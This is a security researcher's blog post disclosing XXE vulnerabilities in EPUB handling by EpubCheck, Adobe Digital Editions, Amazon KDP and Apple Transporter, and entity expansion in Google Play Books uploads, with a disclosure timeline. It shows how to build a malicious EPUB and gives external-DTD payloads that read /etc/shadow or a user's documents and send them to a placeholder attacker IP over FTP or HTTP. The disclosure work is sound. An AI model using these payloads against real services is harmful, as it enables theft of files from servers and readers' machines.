@@ -1,0 +1,145 @@
+<blockquote>
+  <p>“We use the ePub format. We’re very excited about this.” - Steve Jobs, 2010</p>
+</blockquote>
+
+<p>TLDR; Exploiting vulnerabilities in <strong>EpubCheck &lt;= 4.0.1</strong> (EPUB Validation Java Library &amp; tool), <strong>Adobe Digital Editions &lt;= 4.5.2</strong> (book reader), <strong>Amazon KDP</strong> (Kindle Publishing Online Service), <strong>Apple Transporter</strong>, and <strong>Google Play Book uploads</strong>, etc. using the <strong>EPUB</strong> book format.</p>
+
+<p>EPUB is a standard format for open books maintained by <a href="http://www.idpf.org/">IDPF</a> (International Digital Publishing Forum). An epub is based on XML, CSS, XHTML and web content zipped together into a single package, which ends in the extension .epub. Depending on the reader device/application support, <a href="http://www.idpf.org/epub/30/spec/epub30-changes.html#sec-new-changed">EPUB</a> can also support interactivity using Flash and Javascript.</p>
+
+<p>EPUB uses XML metadata to define the document structure, support digital signatures, digital rights (DRM) etc.</p>
+
+<p>eg., epub archive:</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">Archive</span><span class="p">:</span>  <span class="n">book</span><span class="o">.</span><span class="n">epub</span>
+  <span class="n">Length</span>      <span class="n">Date</span>    <span class="n">Time</span>    <span class="n">Name</span>
+<span class="o">---------</span>  <span class="o">----------</span> <span class="o">-----</span>   <span class="o">----</span>
+       <span class="mi">20</span>  <span class="mo">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="p">:</span><span class="mi">41</span>   <span class="n">mimetype</span>
+     <span class="mi">2189</span>  <span class="mo">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="p">:</span><span class="mi">41</span>   <span class="n">toc</span><span class="o">.</span><span class="n">ncx</span>
+    <span class="mi">39962</span>  <span class="mo">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="p">:</span><span class="mi">41</span>   <span class="n">OEBPS</span><span class="o">/</span><span class="n">chapter</span><span class="o">-</span><span class="mo">001</span><span class="o">-</span><span class="n">chapter</span><span class="o">-</span><span class="n">i</span><span class="o">.</span><span class="n">html</span>
+    <span class="mi">41745</span>  <span class="mo">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="p">:</span><span class="mi">41</span>   <span class="n">OEBPS</span><span class="o">/</span><span class="n">chapter</span><span class="o">-</span><span class="mo">002</span><span class="o">-</span><span class="n">chapter</span><span class="o">-</span><span class="n">ii</span><span class="o">.</span><span class="n">html</span>
+      <span class="mi">684</span>  <span class="mo">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="p">:</span><span class="mi">41</span>   <span class="n">OEBPS</span><span class="o">/</span><span class="n">title</span><span class="o">-</span><span class="n">page</span><span class="o">.</span><span class="n">html</span>
+      <span class="mi">557</span>  <span class="mo">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="p">:</span><span class="mi">41</span>   <span class="n">OEBPS</span><span class="o">/</span><span class="n">front</span><span class="o">-</span><span class="n">cover</span><span class="o">.</span><span class="n">html</span>
+    <span class="mi">42220</span>  <span class="mo">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="p">:</span><span class="mi">41</span>   <span class="n">OEBPS</span><span class="o">/</span><span class="n">chapter</span><span class="o">-</span><span class="mo">003</span><span class="o">-</span><span class="n">chapter</span><span class="o">-</span><span class="n">iii</span><span class="o">.</span><span class="n">html</span>
+     <span class="mi">1185</span>  <span class="mo">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="p">:</span><span class="mi">41</span>   <span class="n">OEBPS</span><span class="o">/</span><span class="n">copyright</span><span class="o">.</span><span class="n">html</span>
+      <span class="mi">884</span>  <span class="mo">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="p">:</span><span class="mi">41</span>   <span class="n">OEBPS</span><span class="o">/</span><span class="n">table</span><span class="o">-</span><span class="n">of</span><span class="o">-</span><span class="n">contents</span><span class="o">.</span><span class="n">html</span>
+   <span class="mi">234790</span>  <span class="mo">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="p">:</span><span class="mi">41</span>   <span class="n">OEBPS</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span><span class="n">pressbooks</span><span class="o">-</span><span class="n">promo</span><span class="o">.</span><span class="n">png</span>
+    <span class="mi">33684</span>  <span class="mo">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="p">:</span><span class="mi">41</span>   <span class="n">OEBPS</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span><span class="n">MedulaOne</span><span class="o">-</span><span class="n">Regular</span><span class="o">.</span><span class="n">ttf</span>
+   <span class="mi">244146</span>  <span class="mo">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="p">:</span><span class="mi">41</span>   <span class="n">OEBPS</span><span class="o">/</span><span class="n">assets</span><span class="o">/</span><span class="n">themetamorphosis_1200x1600</span><span class="o">.</span><span class="n">jpg</span>
+      <span class="mi">661</span>  <span class="mo">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="p">:</span><span class="mi">41</span>   <span class="n">OEBPS</span><span class="o">/</span><span class="n">pressbooks</span><span class="o">-</span><span class="n">promo</span><span class="o">.</span><span class="n">html</span>
+    <span class="mi">27328</span>  <span class="mo">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="p">:</span><span class="mi">41</span>   <span class="n">OEBPS</span><span class="o">/</span><span class="n">jackson</span><span class="o">.</span><span class="n">css</span>
+     <span class="mi">3494</span>  <span class="mo">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="p">:</span><span class="mi">41</span>   <span class="n">book</span><span class="o">.</span><span class="n">opf</span>
+      <span class="mi">240</span>  <span class="mo">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="p">:</span><span class="mi">41</span>   <span class="n">META</span><span class="o">-</span><span class="n">INF</span><span class="o">/</span><span class="n">container</span><span class="o">.</span><span class="n">xml</span>
+      <span class="mi">157</span>  <span class="mo">04</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">2014</span> <span class="mi">15</span><span class="p">:</span><span class="mi">41</span>   <span class="n">META</span><span class="o">-</span><span class="n">INF</span><span class="o">/</span><span class="n">com</span><span class="o">.</span><span class="n">apple</span><span class="o">.</span><span class="n">ibooks</span><span class="o">.</span><span class="n">display</span><span class="o">-</span><span class="n">options</span><span class="o">.</span><span class="n">xml</span>
+<span class="o">---------</span>                     <span class="o">-------</span>
+   <span class="mi">673946</span>                     <span class="mi">17</span> <span class="n">files</span></code></pre></div>
+
+<p>eg., contents of META-INF/container.xml</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="o">&lt;</span><span class="err">?</span><span class="n">xml</span> <span class="n">version</span><span class="o">=</span><span class="s">&quot;1.0&quot;</span><span class="err">?</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">container</span> <span class="n">version</span><span class="o">=</span><span class="s">&quot;1.0&quot;</span> <span class="n">xmlns</span><span class="o">=</span><span class="s">&quot;urn:oasis:names:tc:opendocument:xmlns:container&quot;</span><span class="o">&gt;</span>
+ <span class="o">&lt;</span><span class="n">rootfiles</span><span class="o">&gt;</span>
+ <span class="o">&lt;</span><span class="n">rootfile</span> <span class="n">full</span><span class="o">-</span><span class="n">path</span><span class="o">=</span><span class="s">&quot;OEBPS/book.opf&quot;</span>
+ <span class="n">media</span><span class="o">-</span><span class="nb">type</span><span class="o">=</span><span class="s">&quot;application/oebps-package+xml&quot;</span> <span class="o">/&gt;</span>
+ <span class="o">&lt;/</span><span class="n">rootfiles</span><span class="o">&gt;</span>
+<span class="o">&lt;/</span><span class="n">container</span><span class="o">&gt;</span></code></pre></div>
+
+<p>eg., contents of book.opf</p>
+
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="o">&lt;</span><span class="err">?</span><span class="n">xml</span> <span class="n">version</span><span class="o">=</span><span class="s">&quot;1.0&quot;</span> <span class="n">encoding</span><span class="o">=</span><span class="s">&quot;UTF-8&quot;</span> <span class="err">?</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">package</span> <span class="n">version</span><span class="o">=</span><span class="s">&quot;2.0&quot;</span> <span class="n">xmlns</span><span class="o">=</span><span class="s">&quot;http://www.idpf.org/2007/opf&quot;</span> <span class="n">unique</span><span class="o">-</span><span class="n">identifier</span><span class="o">=</span><span class="s">&quot;PrimaryID&quot;</span><span class="o">&gt;</span>
+
+<span class="o">&lt;</span><span class="n">metadata</span> <span class="n">xmlns</span><span class="p">:</span><span class="n">dc</span><span class="o">=</span><span class="s">&quot;http://purl.org/dc/elements/1.1/&quot;</span> <span class="n">xmlns</span><span class="p">:</span><span class="n">opf</span><span class="o">=</span><span class="s">&quot;http://www.idpf.org/2007/opf&quot;</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">dc</span><span class="p">:</span><span class="n">title</span><span class="o">&gt;</span><span class="n">My</span> <span class="n">Book</span> <span class="o">&lt;/</span><span class="n">dc</span><span class="p">:</span><span class="n">title</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">dc</span><span class="p">:</span><span class="n">language</span><span class="o">&gt;</span><span class="n">en</span><span class="o">&lt;/</span><span class="n">dc</span><span class="p">:</span><span class="n">language</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">dc</span><span class="p">:</span><span class="n">identifier</span> <span class="nb">id</span><span class="o">=</span><span class="s">&quot;PrimaryID&quot;</span> <span class="n">opf</span><span class="p">:</span><span class="n">scheme</span><span class="o">=</span><span class="s">&quot;URI&quot;</span><span class="o">&gt;</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">mybook</span><span class="o">.</span><span class="n">com</span><span class="o">&lt;/</span><span class="n">dc</span><span class="p">:</span><span class="n">identifier</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">dc</span><span class="p">:</span><span class="n">description</span><span class="o">&gt;</span><span class="n">Description</span><span class="o">&lt;/</span><span class="n">dc</span><span class="p">:</span><span class="n">description</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">dc</span><span class="p">:</span><span class="n">creator</span> <span class="n">opf</span><span class="p">:</span><span class="n">role</span><span class="o">=</span><span class="s">&quot;aut&quot;</span><span class="o">&gt;</span><span class="n">Author</span><span class="o">&lt;/</span><span class="n">dc</span><span class="p">:</span><span class="n">creator</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">dc</span><span class="p">:</span><span class="n">publisher</span><span class="o">&gt;</span><span class="n">Publisher</span><span class="o">.</span><span class="n">com</span><span class="o">&lt;/</span><span class="n">dc</span><span class="p">:</span><span class="n">publisher</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">meta</span> <span class="n">name</span><span class="o">=</span><span class="s">&quot;cover&quot;</span> <span class="n">content</span><span class="o">=</span><span class="s">&quot;cover-image&quot;</span> <span class="o">/&gt;</span>
+<span class="o">&lt;/</span><span class="n">metadata</span><span class="o">&gt;</span></code></pre></div>
+
+<p>When I first started looking into this, I learned about a tool/Java library called <a href="https://github.com/IDPF/epubcheck/releases">EpubCheck</a> (provided by IDPF) that is used to validate books in the EPUB format. Found that this was vulnerable to XXE so any application that relied on this to check the validity of an EPUB file would be susceptible to this type of attack.</p>
+
+<h4 id="modifying-an-existing-epub-file-to-test-for-xml-parsing-vulnerabilities">Modifying an existing EPUB file to test for XML parsing vulnerabilities:</h4>
+
+<ul>
+  <li>
+    <p><strong>curl https://s3-us-west-2.amazonaws.com/pressbooks-samplefiles/MetamorphosisJacksonTheme/Metamorphosis-jackson.epub -o book.epub</strong></p>
+  </li>
+  <li>
+    <p><strong>unzip book.epub; rm book.epub</strong></p>
+  </li>
+  <li>
+    <p><strong>Edit any of the files defined using XML.</strong> </p>
+  </li>
+</ul>
+
+<p>eg., book.opf  (XML external entities pattern)</p>
+
+<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="o">&lt;?</span><span class="nx">xml</span> <span class="nx">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span> <span class="nx">encoding</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span> <span class="o">?&gt;</span>
+<span class="o">&lt;!</span><span class="nx">DOCTYPE</span> <span class="nx">a</span> <span class="p">[</span><span class="o">&lt;!</span><span class="nx">ENTITY</span> <span class="o">%</span> <span class="nx">b</span> <span class="nx">SYSTEM</span> <span class="s2">&quot;http://123.123.123.123/dtd&quot;</span><span class="o">&gt;%</span><span class="nx">b</span><span class="p">;</span><span class="o">%</span><span class="nx">c</span><span class="p">;]</span><span class="o">&gt;&lt;</span><span class="kr">package</span> <span class="nx">version</span><span class="o">=</span><span class="s2">&quot;2.0&quot;</span> <span class="nx">xmlns</span><span class="o">=</span><span class="s2">&quot;http://www.idpf.org/2007/opf&quot;</span> <span class="nx">unique</span><span class="o">-</span><span class="nx">identifier</span><span class="o">=</span><span class="s2">&quot;PrimaryID&quot;</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">metadata</span> <span class="nx">xmlns</span><span class="o">:</span><span class="nx">dc</span><span class="o">=</span><span class="s2">&quot;http://purl.org/dc/elements/1.1/&quot;</span> <span class="nx">xmlns</span><span class="o">:</span><span class="nx">opf</span><span class="o">=</span><span class="s2">&quot;http://www.idpf.org/2007/opf&quot;</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">dc</span><span class="o">:</span><span class="nx">title</span><span class="o">&gt;</span><span class="nx">Metamorphosis</span><span class="o">&lt;</span><span class="err">/dc:title&gt;</span>
+<span class="o">&lt;</span><span class="nx">dc</span><span class="o">:</span><span class="nx">language</span><span class="o">&gt;</span><span class="nx">en</span><span class="o">&lt;</span><span class="err">/dc:language&gt;</span>
+<span class="o">&lt;</span><span class="nx">dc</span><span class="o">:</span><span class="nx">identifier</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&quot;PrimaryID&quot;</span> <span class="nx">opf</span><span class="o">:</span><span class="nx">scheme</span><span class="o">=</span><span class="s2">&quot;URI&quot;</span><span class="o">&gt;</span><span class="nx">http</span><span class="o">:</span><span class="c1">//metamorphosiskafka.pressbooks.com&lt;/dc:identifier&gt;</span>
+<span class="o">&lt;</span><span class="nx">dc</span><span class="o">:</span><span class="nx">description</span><span class="o">&gt;&amp;</span><span class="nx">send</span><span class="p">;</span><span class="o">&lt;</span><span class="err">/dc:description&gt;</span></code></pre></div>
+
+<ul>
+  <li><strong>Point at a HTTP / FTP server you control</strong></li>
+</ul>
+
+<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="o">&lt;!</span><span class="nx">ENTITY</span> <span class="o">%</span> <span class="nx">d</span> <span class="nx">SYSTEM</span> <span class="s2">&quot;///etc/shadow&quot;</span><span class="o">&gt;</span>
+<span class="o">&lt;!</span><span class="nx">ENTITY</span> <span class="o">%</span> <span class="nx">c</span> <span class="s2">&quot;&lt;!ENTITY send SYSTEM &#39;ftp://123.123.123.123/%d;&#39;&gt;&quot;</span><span class="o">&gt;</span></code></pre></div>
+
+<ul>
+  <li><strong>zip -r book.epub *</strong></li>
+</ul>
+
+<p><strong>EpubCheck &lt;= 4.0.1</strong> </p>
+
+<p>There was a online instance of EpubCheck, that would accept user uploads and perform validation on the format. This provides an example of how this vulnerability could be used to attack online services that support EPUB. Especially if they are using a vulnerable version of EpubCheck to validate the uploaded file.</p>
+
+<p>Uploading our created file:
+<img src="/assets/epub/upload.png" alt="Image" /></p>
+
+<p>HTTP listener receiving the dtd request when parsed by the remote XML parser, and custom FTP listener receiving the file (I didn’t think it would work, but specified /etc/shadow as the file to retrieve).<br />
+<img src="/assets/epub/EPubCheck.png" alt="Image" /></p>
+
+<p>This means that we retrieved the /etc/shadow file. Public facing web apps running as root/system in prod isn’t all that rare… 😫.</p>
+
+<p>A few examples of other services, and applicaions that were vulnerable:</p>
+
+<p><strong>Amazon KDP</strong> which allows publishers to upload books, was susceptible to XXE when converting books to the Kindle format. 
+<img src="/assets/epub/AMZ1.png" alt="Image" />
+<img src="/assets/epub/AMZ2.png" alt="Image" /></p>
+
+<p><strong><a href="http://www.adobe.com/solutions/ebook/digital-editions.html">Adobe Digital Editions</a> &lt;= 4.5.2</strong> (book reader) when a user opens a book, this would allow files to be taken from their system. <a href="https://helpx.adobe.com/security/products/Digital-Editions/apsb16-45.html">CVE-2016-7889</a>.</p>
+
+<p>External DTD specifying the file to retrive:</p>
+
+<div class="highlight"><pre><code class="language-javascript" data-lang="javascript"><span class="o">&lt;!</span><span class="nx">ENTITY</span> <span class="o">%</span> <span class="nx">d</span> <span class="nx">SYSTEM</span> <span class="s2">&quot;file:///c:/Users/Documents/secret.txt&quot;</span><span class="o">&gt;</span>
+<span class="o">&lt;!</span><span class="nx">ENTITY</span> <span class="o">%</span> <span class="nx">c</span> <span class="s2">&quot;&lt;!ENTITY send SYSTEM &#39;http://123.123.123.123/exfil/%d;&#39;&gt;&quot;</span><span class="o">&gt;</span></code></pre></div>
+
+<p>eg., Retriving secret stuff from a users Windows documents folder:
+<img src="/assets/epub/ADE.png" alt="Image" /></p>
+
+<p><strong>Apple Transporter</strong> (underlying tool used to validate metadata and assets and deliver them to the iTunes Store), <a href="https://support.apple.com/en-us/HT207432">CVE-2016-7666</a>.
+<img src="/assets/epub/Transporter.png" alt="Image" /></p>
+
+<p><strong><a href="https://play.google.com/books/uploads">Google Play Book uploads</a></strong> did not allow external entity processing, but was vulnerable to XML exponential entity expansion <a href="https://cwe.mitre.org/data/definitions/776.html">billion laughs</a>. When uploading a EPUB with this pattern, it would spend about 45 minutes trying to process the file before returning an error condition. Google confirmed this on their side.</p>
+
+<p>There are more things going on with the EPUB format beyond the familiar patterns shown here. I’m waiting on vendor responses before talking about this. There may be a part 2 that is less boring.</p>
+
+<p>Disclosure timeline:</p>
+
+<ul>
+  <li>Sep 2016: Reported XXE in EpubCheck 4.0.1.</li>
+  <li>Sep 2016: Reported XXE in Adobe Digital Editions 4.5.2.</li>
+  <li>Sep 2016: Reported XXE in Amazon KDP.</li>
+  <li>Oct 2016: Reported XXE in Apple Transporter</li>
+  <li>Oct 2016: Reported XML exponential entity expansion in play.google.com book uploads.</li>
+  <li>Dec 2016: Coordinated disclosure.</li>
+  <li>Jan 2017: This blog post (giving lots of time for users to patch).</li>
+</ul>
+
+<p>Thanks to <a href="http://www.cert.org/">CERT/CC</a> for their help in coordinating with different vendors, and setting a disclosure timeline.</p>
